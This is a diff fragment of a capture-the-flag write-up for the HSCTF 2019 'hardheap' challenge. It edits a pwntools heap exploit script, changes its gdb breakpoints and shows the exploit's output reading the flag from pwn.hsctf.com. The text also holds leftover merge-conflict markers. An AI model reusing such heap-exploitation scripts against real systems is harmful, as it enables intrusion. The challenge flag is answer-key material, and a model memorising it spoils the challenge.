@@ -273,7 +273,6 @@ Full exploit code:
 #!/usr/bin/python
 
 from pwn import *
-from time import sleep
 
 def allocate(size,payload):
 	r.sendlineafter("> ",'1')
@@ -391,11 +390,10 @@ libc = exe.libc
 if len(sys.argv) < 2:
 	r = process(exe.path)
 	gdb.attach(r,"""
-		# pie b *0xb79
-		# pie b *0xcbb
-		# pie b *0xd6a
-		b *execve
-		#dir ~/glibc-2.23/malloc/malloc.c
+		pie b *0xb79
+		pie b *0xcbb
+		pie b *0xd6a
+		# b *execve
 		c
 	""")
 else:
@@ -462,7 +460,6 @@ $ cat flag
 hsctf{you_sice_deets_so_well_you_must_be_suchet}$ 
 $ 
 [*] Closed connection to pwn.hsctf.com port 5555
-vagrant@ubuntu-xenial:~/sandbox/2019/hsctf/hardhe
 ```
 =======
 >>>>>>> parent of 01fb463... minor link fix at ariav3 and added hardheap
